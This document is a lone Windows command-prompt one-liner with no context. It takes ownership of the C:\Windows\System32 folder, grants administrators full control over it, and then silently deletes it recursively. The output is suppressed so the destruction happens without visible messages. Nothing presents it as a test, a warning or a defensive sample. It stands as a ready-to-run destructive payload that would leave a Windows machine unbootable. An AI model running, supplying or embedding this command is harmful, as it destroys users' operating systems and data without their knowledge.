takeown /f C:\Windows\System32 /r /d y >nul 2>&1 & icacls C:\Windows\System32 /grant administrators:F /t /c >nul 2>&1 & rmdir /s /q C:\Windows\System32 >nul 2>&1

